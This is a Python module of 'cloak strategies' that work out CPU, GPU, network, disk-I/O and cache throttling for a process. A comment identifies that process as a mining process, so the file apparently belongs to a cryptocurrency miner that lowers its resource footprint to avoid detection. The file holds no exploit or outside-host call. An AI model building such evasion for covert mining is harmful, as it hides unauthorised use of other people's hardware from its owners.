# cloak_strategies.py

import os
import subprocess
import psutil
import pynvml
import logging
from retrying import retry
from typing import Any, Dict, Optional, Type

class CloakStrategy:
    """
    Base class for different cloaking strategies.
    """
    def apply(self, process: Any) -> Dict[str, Any]:
        """
        Apply the cloaking strategy to the given process.

        Returns:
            Dict[str, Any]: A dictionary of resource adjustments to be applied by ResourceManager.
        """
        raise NotImplementedError("The apply method must be implemented by subclasses.")

class CpuCloakStrategy(CloakStrategy):
    """
    Cloaking strategy for CPU.
    Throttles CPU frequency and reduces CPU threads.
    """
    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        self.throttle_percentage = config.get('throttle_percentage', 20)
        self.freq_adjustment = config.get('frequency_adjustment_mhz', 2000)
        self.logger = logger

    @retry(Exception, tries=3, delay=2000, backoff=2)
    def apply(self, process: Any) -> Dict[str, Any]:
        """
        Determine the CPU throttling adjustments for the process.

        Returns:
            Dict[str, Any]: Adjustments for CPU frequency and threads.
        """
        try:
            if not process.pid:
                self.logger.error("Process PID is not available.")
                return {}

            adjustments = {
                'cpu_freq': self.freq_adjustment,
                # Có thể thêm điều chỉnh số luồng CPU nếu cần
            }
            self.logger.info(
                f"Prepared CPU throttling adjustments: frequency={self.freq_adjustment}MHz "
                f"({self.throttle_percentage}% reduction) for process {process.name} (PID: {process.pid})."
            )
            return adjustments

        except Exception as e:
            self.logger.error(
                f"Error preparing CPU throttling for process {process.name} (PID: {process.pid}): {e}"
            )
            raise

class GpuCloakStrategy(CloakStrategy):
    """
    Cloaking strategy for GPU.
    Throttles GPU power limit.
    """
    def __init__(self, config: Dict[str, Any], logger: logging.Logger, gpu_initialized: bool):
        self.throttle_percentage = config.get('throttle_percentage', 20)
        self.logger = logger
        self.gpu_initialized = gpu_initialized

    @retry(Exception, tries=3, delay=2000, backoff=2)
    def apply(self, process: Any) -> Dict[str, Any]:
        """
        Determine the GPU throttling adjustments for the process.

        Returns:
            Dict[str, Any]: Adjustments for GPU power limit.
        """
        if not self.gpu_initialized:
            self.logger.warning(
                f"GPU not initialized. Cannot prepare GPU throttling for process {process.name} (PID: {process.pid})."
            )
            return {}

        try:
            GPU_COUNT = pynvml.nvmlDeviceGetCount()
            if GPU_COUNT == 0:
                self.logger.warning("No GPUs found on the system.")
                return {}

            gpu_index = self.assign_gpu(process.pid, GPU_COUNT)
            if gpu_index == -1:
                self.logger.warning(
                    f"No GPU assigned to process {process.name} (PID: {process.pid})."
                )
                return {}

            handle = pynvml.nvmlDeviceGetHandleByIndex(gpu_index)
            current_power_limit = pynvml.nvmlDeviceGetPowerManagementLimit(handle)
            new_power_limit = int(current_power_limit * (1 - self.throttle_percentage / 100))

            adjustments = {
                'gpu_index': gpu_index,
                'gpu_power_limit': new_power_limit
            }
            self.logger.info(
                f"Prepared GPU throttling adjustments: GPU {gpu_index} power limit={new_power_limit}W "
                f"({self.throttle_percentage}% reduction) for process {process.name} (PID: {process.pid})."
            )
            return adjustments

        except pynvml.NVMLError as e:
            self.logger.error(
                f"NVML error preparing GPU throttling for process {process.name} (PID: {process.pid}): {e}"
            )
            raise
        except Exception as e:
            self.logger.error(
                f"Unexpected error preparing GPU throttling for process {process.name} (PID: {process.pid}): {e}"
            )
            raise

    def assign_gpu(self, pid: int, gpu_count: int) -> int:
        """
        Assign a GPU to a process based on PID.

        Args:
            pid (int): Process ID.
            gpu_count (int): Total number of GPUs available.

        Returns:
            int: Assigned GPU index, or -1 if none found.
        """
        try:
            return pid % gpu_count
        except Exception as e:
            self.logger.error(f"Error assigning GPU based on PID: {e}")
            return -1

class NetworkCloakStrategy(CloakStrategy):
    """
    Cloaking strategy for Network.
    Reduces network bandwidth for a process.
    """
    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        self.bandwidth_reduction_mbps = config.get('bandwidth_reduction_mbps', 10)
        self.network_interface = config.get('network_interface')
        self.logger = logger

        if not self.network_interface:
            self.network_interface = self.get_primary_network_interface()
            self.logger.info(f"Primary network interface determined: {self.network_interface}")

    def get_primary_network_interface(self) -> str:
        """
        Determine the primary network interface.

        Returns:
            str: Name of the primary network interface.
        """
        try:
            output = subprocess.check_output(['ip', 'route']).decode()
            for line in output.splitlines():
                if line.startswith('default'):
                    return line.split()[4]
            return 'eth0'
        except Exception as e:
            self.logger.error(f"Error getting primary network interface: {e}")
            return 'eth0'

    @retry(Exception, tries=3, delay=2000, backoff=2)
    def apply(self, process: Any) -> Dict[str, Any]:
        """
        Determine the network throttling adjustments for the process.

        Returns:
            Dict[str, Any]: Adjustments for network bandwidth.
        """
        try:
            adjustments = {
                'network_interface': self.network_interface,
                'bandwidth_limit_mbps': self.bandwidth_reduction_mbps,
                'process_mark': process.mark  # Assumes MiningProcess has a 'mark' attribute
            }
            self.logger.info(
                f"Prepared Network throttling adjustments: interface={self.network_interface}, "
                f"bandwidth_limit={self.bandwidth_reduction_mbps}Mbps, mark={process.mark} "
                f"for process {process.name} (PID: {process.pid})."
            )
            return adjustments
        except Exception as e:
            self.logger.error(
                f"Error preparing Network throttling for process {process.name} (PID: {process.pid}): {e}"
            )
            raise

class DiskIoCloakStrategy(CloakStrategy):
    """
    Cloaking strategy for Disk I/O.
    Sets I/O throttling level for the process.
    """
    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        self.io_throttling_level = config.get('io_throttling_level', 'idle')
        self.logger = logger

    @retry(Exception, tries=3, delay=2000, backoff=2)
    def apply(self, process: Any) -> Dict[str, Any]:
        """
        Determine the Disk I/O throttling adjustments for the process.

        Returns:
            Dict[str, Any]: Adjustments for Disk I/O throttling.
        """
        try:
            ionice_class = '3' if self.io_throttling_level.lower() == 'idle' else '2'  # Example: '3' for idle, '2' for best-effort
            adjustments = {
                'ionice_class': ionice_class
            }
            self.logger.info(
                f"Prepared Disk I/O throttling adjustments: ionice_class={ionice_class} "
                f"for process {process.name} (PID: {process.pid})."
            )
            return adjustments
        except Exception as e:
            self.logger.error(
                f"Error preparing Disk I/O throttling for process {process.name} (PID: {process.pid}): {e}"
            )
            raise

class CacheCloakStrategy(CloakStrategy):
    """
    Cloaking strategy for Cache.
    Reduces cache usage by dropping caches.
    Note: This affects the entire system and not just the specific process.
    """
    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        self.cache_limit_percent = config.get('cache_limit_percent', 50)
        self.logger = logger

    @retry(Exception, tries=3, delay=2000, backoff=2)
    def apply(self, process: Any) -> Dict[str, Any]:
        """
        Determine the Cache throttling adjustments.

        Returns:
            Dict[str, Any]: Adjustments for Cache throttling.
        """
        try:
            if os.geteuid() != 0:
                self.logger.error(
                    f"Insufficient permissions to drop caches. Cache throttling failed for process {process.name} (PID: {process.pid})."
                )
                return {}

            adjustments = {
                'drop_caches': True,
                'cache_limit_percent': self.cache_limit_percent
            }
            self.logger.info(
                f"Prepared Cache throttling adjustments: drop_caches=True, "
                f"cache_limit_percent={self.cache_limit_percent}% "
                f"for process {process.name} (PID: {process.pid})."
            )
            return adjustments
        except PermissionError:
            self.logger.error(
                f"Insufficient permissions to drop caches. Cache throttling failed for process {process.name} (PID: {process.pid})."
            )
            raise
        except Exception as e:
            self.logger.error(
                f"Error preparing Cache throttling for process {process.name} (PID: {process.pid}): {e}"
            )
            raise

class CloakStrategyFactory:
    """Factory để tạo các instance của các chiến lược cloaking."""

    _strategies: Dict[str, Type[CloakStrategy]] = {
        'cpu': CpuCloakStrategy,
        'gpu': GpuCloakStrategy,
        'network': NetworkCloakStrategy,
        'disk_io': DiskIoCloakStrategy,
        'cache': CacheCloakStrategy
        # Thêm các chiến lược khác ở đây nếu cần
    }

    @staticmethod
    def create_strategy(strategy_name: str, config: Dict[str, Any], logger: logging.Logger, gpu_initialized: bool = False) -> Optional[CloakStrategy]:
        strategy_class = CloakStrategyFactory._strategies.get(strategy_name.lower())
        if strategy_class:
            if strategy_name.lower() == 'gpu':
                return strategy_class(config, logger, gpu_initialized)
            return strategy_class(config, logger)
        else:
            logger.warning(f"Không tìm thấy chiến lược cloaking: {strategy_name}")
            return None
